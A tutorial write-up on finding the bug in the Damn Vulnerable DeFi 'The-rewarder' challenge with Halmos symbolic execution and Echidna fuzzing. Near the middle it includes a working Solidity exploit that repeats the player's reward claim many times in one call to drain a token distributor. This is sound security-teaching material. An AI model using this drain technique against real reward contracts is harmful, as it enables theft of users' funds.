# Halmos vs The-rewarder
## Halmos version
halmos 0.2.2.dev1+gd4cac2e was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. ["Naive-receiver"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. ["Side-entrance"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)

since the main ideas here are largely repeated and we will not dwell on them again.

Also, let's clearly talk that despite the same name, the **"The-rewarder"** challenge in v4 has completely new conditions and bug mechanics compared to v3. Therefore, it is highly recommended to familiarize yourself with the new **"The-rewarder"** and the common solution to this problem. We will focus specifically on the use of Halmos, but not on the description of the challenge.
## Preparation
### Common prerequisites
1. Copy **TheRewarder.t.sol** file to **TheRewarderHalmos.t.sol**.
2. Rename `test_theRewarder()` to `check_theRewarder()`, so Halmos will execute this test symbolically.
3. Avoid using `makeAddr()` cheatcode. Due to the specifics of the task, hard-coded addresses will look unusual. This time, we will take the **player's** and **Alice's** addresses directly from **weth-distribution.json**, because the very logic of the task is tied to these addresses:
    ```solidity
    address deployer = address(0xcafe0000);
    address recovery = address(0xcafe0002);
    address alice = address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6);
    address player = address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C);
    ```
4. Create **GlobalStorage** contract and save address-name pairs of contracts:
    ```solidity
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(dvt), "DamnValuableToken");
        glob.add_addr_name_pair(address(weth), "WETH");
        glob.add_addr_name_pair(address(distributor), "TheRewarderDistributor");
    }
    ```
    we ignore the `merkle` contract, since it is completely readonly.
5. Bypass issue #338
    ```solidity
    startHoax(deployer, 1 << 80);
    ```
6. Print all contract addresses:
    ```solidity
    console.log("GlobalStorage", address(glob));
    console.log("DamnValuableToken", address(dvt));
    console.log("WETH", address(weth));
    console.log("TheRewarderDistributor", address(distributor));
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_theRewarder
    ...
    [console.log] GlobalStorage 0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] DamnValuableToken 0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] WETH 0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] TheRewarderDistributor 0x00000000000000000000000000000000000000000000000000000000aaaa0006
    ```
7. `vm.expectRevert()` is an unsupported cheat-code. Just delete it.
### _isSolved() implementation
The original checks look like:
```solidity
// Player saved as much funds as possible, perhaps leaving some dust
assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

// All funds sent to the designated recovery account
assertEq(
    dvt.balanceOf(recovery),
    TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
    "Not enough DVT in recovery account"
);
assertEq(
    weth.balanceOf(recovery),
    TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
    "Not enough WETH in recovery account"
);
```
As usual, we check whether we can empty the distributor of some unexpected amount. Note that the formula here will be a bit more complicated than we are used to seeing. First, we take into account that **Alice** has taken her reward and it is expected that the player himself can take his reward once. Therefore, the invariant looks like this:
```solidity
function _isSolved() private view {
    assert (dvt.balanceOf(address(distributor)) >= 
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - 11524763827831882);
    assert (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - 1171088749244340);
}
```
`11524763827831882` and `1171088749244340` are the amounts of **DVT** and **WETH** the player is expected to be able to collect as he is one of the reward recipients. We took these numbers from **dvt-distribution.json** and **weth-distribution.json**.
### Loading rewards
In the setup process, the original test internally parses 1000 records in **JSON** format and uploads them to the **distributor** contract. However, there is a problem: Halmos does not support the required cheat codes, namely `vm.projectRoot()`, `vm.readFile()` and `vm.parseJson()`. We will work around this problem in a somewhat dirty but effective way. Instead of parsing the **JSON**, we will immediately explicitly insert the bytes into the right place. 

First, let's log the necessary bytes from the original **TheRewarder.t.sol**:
```solidity
function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
    console.logBytes(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))));
    ...
```
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
...
Logs:
  0x000...e962
  0x000...b3d4
```
Insert it into the Halmos test:
```solidity
function setUp() public {
    ...
    bytes32[] memory dvtLeaves = _loadRewardsDVT();
    bytes32[] memory wethLeaves = _loadRewardsWETH();
    ...
}
...
function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...e962", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
    
    
function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...b3d4", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
```
This thing takes a long time in Halmos: it took all of 1 minute on my machine to create **dvt** and **weth** leaves.
### Dealing with Merkle functions
Before proceeding, it is highly recommended to understand how [Merkle trees](https://www.investopedia.com/terms/m/merkle-tree.asp) work and how they check for a leaf presence in the tree.

Again cryptography puts a spanner in our works.
This time when we try to run the test we get an error:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder
...
Error: setUp() failed: HalmosException: No successful path found in setUp()
```
The problem is in `merkle.getRoot()`:
```solidity
function getRoot(bytes32[] memory data) public pure virtual returns (bytes32) {
    require(data.length > 1, "won't generate root for single leaf");
    while (data.length > 1) {
        data = hashLevel(data);
    }
    return data[0];
}
```
Halmos doesn't do well with large loops. Of course, we can try running Halmos with a big enough `--loop` option. But here we encounter another issue. The easiest way to show this is by adding some logging:
```solidity
console.log("start get root");
dvtRoot = merkle.getRoot(dvtLeaves);
console.log("end get root");
console.log("start get root 2");
wethRoot = merkle.getRoot(wethLeaves);
console.log("end get root 2");
...
 // Create DVT distribution
dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
distributor.createDistribution({
    token: IERC20(address(dvt)),
    newRoot: dvtRoot,
    amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
});
console.log("approve 1");

// Create WETH distribution
weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
distributor.createDistribution({
    token: IERC20(address(weth)),
    newRoot: wethRoot,
    amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
});
console.log("approve 2");
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 --solver-timeout-branching 0
...
[console.log] start get root 1
[console.log] end get root 1
[console.log] start get root 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
[console.log] end get root 2
[console.log] approve 1
[console.log] approve 2
...  
```
For some reason, Halmos does unnecessary branching in `merkle.getRoot(wethLeaves)`, where it is not needed or expected at all. The fact is that Halmos does not return a specific root here, but some symbolic gibberish because of complexity of formulas:
```solidity
console.log("start get root");
dvtRoot = merkle.getRoot(dvtLeaves);
console.logBytes32(dvtRoot);
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 10000 --solver-timeout-branching 0
...
[console.log] start get root
[console.log] f_sha3_512(Concat(f_sha3_512(Concat(f_sha3_512(Concat(f_sha3_512(Concat...de962)))))))))))))))))))))
...
```
The good news is that we don't have to look for root in the runtime. It is enough to calculate it once, even in the original forge test and hardcode it:
```solidity
merkle = new Merkle();
console.logBytes32(merkle.getRoot(dvtLeaves));
console.logBytes32(merkle.getRoot(wethLeaves));
...
```
And this is what we got:
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
...
Logs:
    0x399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4
    0x5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6
    ...
```
So, Halmos test:
```solidity
merkle = new Merkle();
dvtRoot = hex"399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4";
wethRoot = hex"5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6";
//dvtRoot = merkle.getRoot(dvtLeaves);
//wethRoot = merkle.getRoot(wethLeaves);
```
Let's do a similar trick with Alice's `merkle.getProof()`. Halmos test is changed to:
```solidity
// Create Alice's claims
Claim[] memory claims = new Claim[](2);
bytes32[] memory dvtproof = new bytes32[](3);
dvtproof[0] = hex"925450a3cfe3826ad85358e2b3df638edc7c8553b6faee9e40fd9c6e9e3a3e04";
dvtproof[1] = hex"f262e0db29c13826883ed5262d51ad286f1bd627b4632141534c6cb80f01f430";
dvtproof[2] = hex"5ad8d27e776667615f79b7c7be79980ac8352518ca274a8ed68a9953ee4302d5";

bytes32[] memory wethproof = new bytes32[](3);
wethproof[0] = hex"7217ae40b137a0d9d7179ef8bb0d0a0a8002dc6fefed8e9faa17b29bc037b747";
wethproof[1] = hex"fdad7418265f24fd2100fbcde33a22785f151aa01ab26aefd76c58bbfa0a9592";
wethproof[2] = hex"0be25e66daab92e7052e6c307ae4743bba49ae08c7324acbc3eb730f51b991e0";

// First, the DVT claim
claims[0] = Claim({
    batchNumber: 0, // claim corresponds to first DVT batch
    amount: ALICE_DVT_CLAIM_AMOUNT,
    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
    proof: dvtproof // Alice's address is at index 2
});
console.log("claims[0] created");

// And then, the WETH claim
claims[1] = Claim({
    batchNumber: 0, // claim corresponds to first WETH batch
    amount: ALICE_WETH_CLAIM_AMOUNT,
    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
    proof: wethproof // Alice's address is at index 2
});
```
Next, let's look at `MerkleProof.verify()` from `TheRewarderDistributor::claimRewards()`:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    bytes32 root = distributions[token].roots[inputClaim.batchNumber];
    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
    ...
}
```
**MerkleProof** contract:
```solidity
function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
    return processProof(proof, leaf) == root;
}
...
function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
    bytes32 computedHash = leaf;
    for (uint256 i = 0; i < proof.length; i++) {
        computedHash = _hashPair(computedHash, proof[i]);
    }
    return computedHash;
}
```
Obviously, we cannot find such an `inputClaim.proof` using symbolic analysis methods, this would literally mean breaking hash cryptography. 
Therefore, Halmos will not work properly without finding a valid proof.
However, there is a way out. We have already met with cryptographic checks in [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver#optimizations).
There we completely removed the cryptographic verification, but clearly indicated that the entered data was correct. We will do something similar here: remove the cryptographic verification, but assume that we transferred the correct **amount** for our `msg.sender` (this is what this cryptographic verification about):
```solidity
...
if (msg.sender == address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // player address
{
    if (address(token) == address(0xaaaa0003)) // If DVT token
        vm.assume(inputClaim.amount == 11524763827831882);
    else if (address(token) == address(0xaaaa0004)) // If WETH token
        vm.assume(inputClaim.amount == 1171088749244340);
}
//bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
//bytes32 root = distributions[token].roots[inputClaim.batchNumber];

//if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
...
```
### Avoiding nested vm.startPrank()
The current version of Halmos does not support nested `startPrank()`. So let's replace
```solidity
startHoax(deployer, 1 << 80);
...
vm.startPrank(alice);
...
vm.stopPrank(); // stop alice prank
vm.stopPrank(); // stop deployer prank
```
by
```solidity
startHoax(deployer, 1 << 80);
...
vm.stopPrank(); // stop deployer prank
vm.startPrank(alice);
...
vm.stopPrank(); // stop alice prank
```
Wow, it was really a long preparation. Let's move on to the next steps!
## No SymbolicAttacker? 
There is a feature in this challenge that prevents us from using the convenient **SymbolicAttacker** proxy contract. Since the logic of **TheRewarderDistributor** contract is tied to the player's specific address, `msg.sender` in **TheRewarderDistributor** should be exactly the player's address. Instead, we'll move all of the **SymbolicAttacker** logic right into **TheRewarderChallenge** contract.
## Improvement of coverage
According to the plan, launch one symbolic transaction to check whether all paths are covered:
```solidity
function attack() private {
    execute_tx();
    //execute_tx();
}
function check_theRewarder() public checkSolvedByPlayer {
    ...
    attack();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder
...
[ERROR] check_theRewarder() (paths: 180, time: 30.22s, bounds: [])
WARNING:halmos:Encountered symbolic memory offset: 704 + Concat(Extract(250, 0, p_inputClaims[0].tokenIndex_uint256_5cfd392_07), 0)
...
WARNING:halmos:check_theRewarder(): paths have not been fully explored due to the loop unrolling bound: 2
...
```
### Increase the symbolic loops
We have as many as 3 contracts stored in **GlobalStorage**, but Halmos runs 2 loop iterations by default. Let's add the parameter `--loop 3` to the Halmos command.
### Symbolic token index
The old symbolic offset problem, but in a new form. This time we are trying to retrieve an IERC20 token by index, which is a symbolic value. and Halmos doesn't like it:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    if (token != inputTokens[inputClaim.tokenIndex]) {
...
```
Since we do not have any restrictions on the size of the `inputTokens` array, literally any address can be found by the symbolic index. Therefore, we will get around this symbolic offset issue by using a **symbolic token** instead of `inputTokens[inputClaim.tokenIndex]` everywhere:
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    ...
    address symbolicInputToken = svm.createAddress("SymbolicInputToken");
    if (msg.sender != address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C)) // If Alice 
    {
        symbolicInputToken = address(inputTokens[inputClaim.tokenIndex]);
    }
    //if (token != inputTokens[inputClaim.tokenIndex]) {
    if (token != IERC20(symbolicInputToken)) {
        ...
        //token = inputTokens[inputClaim.tokenIndex];
        token = IERC20(symbolicInputToken);
        ...
    }
    ...
    //inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    IERC20(token).transfer(msg.sender, inputClaim.amount);
}
```
Here it is also worth explicitly talking about how Halmos handles arrays of symbolic size, as in this case (if player calls this function symbolically - the size of `inputClaims` and `inputTokens` arrays will be symbolic). This is regulated by the `--default-array-lengths` parameter, which by default is "0,1,2". This means that Halmos will handle 3 cases separately: when array size is 0, when it is 1, and when it is 2.

Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder --loop 3
...
Counterexample:
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0003
halmos_SymbolicInputToken_address_b649884_30 = 0x00000000000000000000000000000000aaaa0003
halmos_selector_bytes4_d3ac38a_28 = claimRewards
halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000028f1b62e14044a
p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
...
Counterexample:
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
halmos_selector_bytes4_d3ac38a_28 = claimRewards
halmos_target_address_dbdff73_03 = 0x00000000000000000000000000000000aaaa0006
p_inputClaims[0].amount_uint256_0ac9401_08 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
p_inputClaims[0].batchNumber_uint256_31113fc_07 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[0].proof_length_7e0bd7f_10 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims[1].amount_uint256_916073c_14 = 0x0000000000000000000000000000000000000000000000000004291958e62fb4
p_inputClaims[1].batchNumber_uint256_4f51f7f_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputClaims[1].proof_length_108c345_16 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputClaims_length_8309fbf_06 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_inputTokens[0]_address_58409a8_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens[1]_address_b9b63db_21 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_inputTokens_length_8a67349_19 = 0x0000000000000000000000000000000000000000000000000000000000000002
```
We were lucky: one symbolic transaction was enough to find the bug. Let's deal with a counterexample.
## Counterexamples analysis
The 2 counterexamples provided are essentially one bug that worked separately on **DVT** and **WETH** tokens. In simple words, we can collect our reward several times if we pass the same token index into different `tokenIndex` elements of `inputClaims[]` array:
```javascript
halmos_SymbolicInputToken_address_05635b7_29 = 0x00000000000000000000000000000000aaaa0004
halmos_SymbolicInputToken_address_7b0d29c_30 = 0x00000000000000000000000000000000aaaa0004
```
Remember that we replaced the `inputTokens[inputClaim.tokenIndex]` logic with a `SymbolicInputToken`, so, the logic of the bug is not so obvious from the counterexample. But nevertheless - a bug was found.
## Using a counterexample
In the Halmos test, we ignored cryptographic checks. However, we will use them here. We also remember that we need to transfer all funds to **recovery**. So, let's build an attack so as to empty the **distributor** for the maximum possible amount:
```solidity
function test_theRewarder() public checkSolvedByPlayer {
    bytes32[] memory dvtLeaves = _loadRewards(
        "/test/the-rewarder/dvt-distribution.json"
    );
    bytes32[] memory wethLeaves = _loadRewards(
        "/test/the-rewarder/weth-distribution.json"
    );
    uint256 dvtPlayerReward = 11524763827831882;
    uint256 wethPlayerReward = 1171088749244340;
    uint256 dvtAttackCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtPlayerReward;
    uint256 wethAttackCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethPlayerReward;

    Claim[] memory claims = new Claim[](dvtAttackCount + wethAttackCount);
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));
    for (uint256 i = 0; i < dvtAttackCount; i++) {
        claims[i] = Claim({
        batchNumber: 0, // claim corresponds to first DVT batch
        amount: dvtPlayerReward,
        tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
        proof: merkle.getProof(dvtLeaves, 188) // player's address is at index 188
        });
    }
    for (uint256 i = 0; i < wethAttackCount; i++) {
        claims[dvtAttackCount + i] = Claim({
        batchNumber: 0, // claim corresponds to first DVT batch
        amount: wethPlayerReward,
        tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
        proof: merkle.getProof(wethLeaves, 188) // player's address is at index 188
        });
    }

    distributor.claimRewards({
        inputClaims: claims,
        inputTokens: tokensToClaim
    });

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```
Run:
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol
...
[PASS] test_theRewarder() (gas: 1005136185)
...
```
Another challenge was solved using a bug found by Halmos!
## Fuzzing time
At the time of writing, I have not found a fuzzing solution for the updated version of **The-Rewarder**. Let's try to implement it ourselves. We'll use **Echidna** as fuzzing engine.
### Common preparations
Echidna config file:
```javascript
deployer: '0xcafe0001' 
sender: ['0x44E97aF4418b7a17AABD8090bEA0A471a366305C']
allContracts: true
workers: 8
balanceContract: 100000000000000000000000000000000000000000000000000000000000000000000000
```
Since Echidna has the same problems with loading data from **JSON** - let's do the same trick using hardcoded data:
```solidity
constructor() public payable {
    ...
    bytes32[] memory dvtLeaves = _loadRewardsDVT();
    bytes32[] memory wethLeaves = _loadRewardsWETH();
    ...
}
...
function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...e962", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}

function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...b3d4", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
```
Also, for simplicity, we completely ignore the logic with **Alice**, since the fact that she took her tokens does not affect the presence of the bug in any way. We are only interested in whether Echidna can find the bug. 

So, invariant:
```solidity
function echidna_testSolved() public returns (bool) {
    if (dvt.balanceOf(address(distributor)) >= 
        TOTAL_DVT_DISTRIBUTION_AMOUNT - 11524763827831882) 
    {
        if (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT - 1171088749244340) 
        {
            return true;
        }
    }
    return false;
}
```
For Echidna, we will also simplify the task of proof checking in `TheRewarderDistributor::claimRewards()`. Let's remove this check but assume that we have passed correct arguments:
```solidity
if (token != inputTokens[inputClaim.tokenIndex]) {
    if (inputTokens[inputClaim.tokenIndex] == 
        IERC20(address(0x62d69f6867A0A084C6d313943dC22023Bc263691))) // weth
    {
        inputClaim.amount = 1171088749244340;
    }
    else if (inputTokens[inputClaim.tokenIndex] == 
        IERC20(address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84))) // dvt)
    {
        inputClaim.amount = 11524763827831882;
    }
    ...
    //bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    //bytes32 root = distributions[token].roots[inputClaim.batchNumber];

    //if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
```
Run:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: passing
...
```
Nothing. 
### Analysis of the limits of Echidna
After this fail, I decided to check whether it would even be able to craft valid parameters that would take away at least its "fair" reward. 

Let's simplify the invariant for a while:
```solidity
function echidna_testSolved() public returns (bool) {
    if (dvt.balanceOf(address(distributor)) >= 
        TOTAL_DVT_DISTRIBUTION_AMOUNT/* - 11524763827831882*/) 
    {
        if (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT/* - 1171088749244340*/) 
        {
            return true;
        }
    }
    return false;
}
```
Run again:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: failed!💥
  Call sequence:
    TheRewarderDistributor.claimRewards([(3, 4, 2, ["s\208n\ENQ\233\198\246v\157\134Gsw\200)N\SI\137\210\184\138\175\254\207\217\DEL\197sy\235T\236", "z\DLE]\155\142)b\199\146\SI\159o\193\\\228\156\EOTk\237\216j\SOH%\131\193\&5\170\DELqzw\223"])],[0x1fffffffe, 0x1fffffffe, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0xffffffff, 0x62d69f6867a0a084c6d313943dc22023bc263691, 0x2fffffffd, 0x1fffffffe, 0xffffffff, 0x0, 0xb4c79dab8f259c7aee6e5b2aa729821864227e84])
...
```
Cool! At least the "fair" transaction it found. Let's check if Echidna is able to generate the same simple transaction, but with a larger `inputClaims` array (at least of size 2):
```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    require(inputClaims.length >= 2);
    ...
```
Try:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: passing
...
```
Yeah, the problem is that Echidna has a hard time generating an inputClaims array of size at least 2. I found the following [article](https://secure-contracts.com/program-analysis/echidna/fuzzing_tips.html#handling-dynamic-arrays) that recommends using the **push-pop-use** pattern in such cases. Also for this test we returned the **invariant** again.
```solidity
contract TheRewarderDistributor {
    ...
    Claim[] public storageInputClaims;
    IERC20[] public storageInputTokens;
    ...
    function pushClaim(Claim memory claim) public {
        storageInputClaims.push(claim);
    }
    
    function pushToken(IERC20 token) public {
        storageInputTokens.push(token);
    }

    ...
    function claimRewards(/*Claim[] memory inputClaims, IERC20[] memory inputTokens*/) external {
        ...
         for (uint256 i = 0; i < storageInputClaims.length; i++) {
            inputClaim = storageInputClaims[i];
            ...
            if (token != storageInputTokens[inputClaim.tokenIndex]) {
                ...
                token = storageInputTokens[inputClaim.tokenIndex];
                ...
            }
            ...
            // for the last claim
            if (i == storageInputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
            ...
        }
}
```
Start and pray:
```javascript
$ echidna test/the-rewarder/TheRewarderEchidna.sol --contract TheRewarderEchidna --config test/the-rewarder/the-rewarder.yaml --test-limit 10000000
...
echidna_testSolved: failed!💥
  Call sequence:
    TheRewarderDistributor.pushClaim((0, 0, 0, []))
    TheRewarderDistributor.pushToken(0xb4c79dab8f259c7aee6e5b2aa729821864227e84)
    TheRewarderDistributor.pushClaim((0, 0, 0, []))
    TheRewarderDistributor.claimRewards()
...
```
Success! the push-pop pattern really turned out to be effective. Note that although the counterexample does not show a valid amount, we remember that we specified it explicitly instead of a cryptographic check.
## Conclusions
1. Even if we face some engine limitations (Halmos or Echidna) - don't be afraid to use "dirty" tricks, even if they look ugly. All for the sake of the result!
2. When constructing tests with cryptographic checks, there is a very effective technique: we do not check cryptography at all, but we explicitly assume that the data was entered correctly.
3. If we compare how Halmos and Echidna coped with this challenge, we can say that both tools did quite well. But, in my opinion, Halmos was a little more convenient - every step of contract preparation was obvious and planned, the tool itself gave a hint on how to change the target contract through warnings. At the same time, in the case of Echidna, we had to find the limits of code coverage manually and use not the most obvious technique to force fuzzing to cover the case with 2 inputClaims.
